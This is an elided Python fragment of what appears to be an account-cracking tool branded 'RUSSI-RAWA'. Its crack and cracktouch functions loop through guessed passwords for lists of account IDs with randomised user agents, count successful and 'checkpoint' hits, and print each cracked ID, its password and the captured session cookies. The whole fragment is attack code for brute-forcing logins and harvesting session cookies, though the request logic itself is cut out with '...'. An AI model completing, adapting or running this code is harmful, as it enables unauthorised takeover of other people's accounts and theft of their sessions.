...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[RUSSI-RAWA]\033[1;32m{Z}{b}{loop}{Z}|{b}{len(id)} \x1b[38;5;8m[\x1b[38;5;8mOK∙{ok}\x1b[38;5;43m] {P}{'{:.0%}'.format(loop/float(len(id)))}"),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\033[0;32m[OK] {h}{idf} | {h}{pw} \n {h}╚═➣DATE \x1b[0;32m{tahun(idf)} └──> Cookies🤎 \033[38;5;52m{kuki}')
...
def cracktouch(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write(f"\r{x}[{h}RUSSI{x}]{k} {P}[{b}{loop}{P}/{u}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	for pw in pwv:
		try:
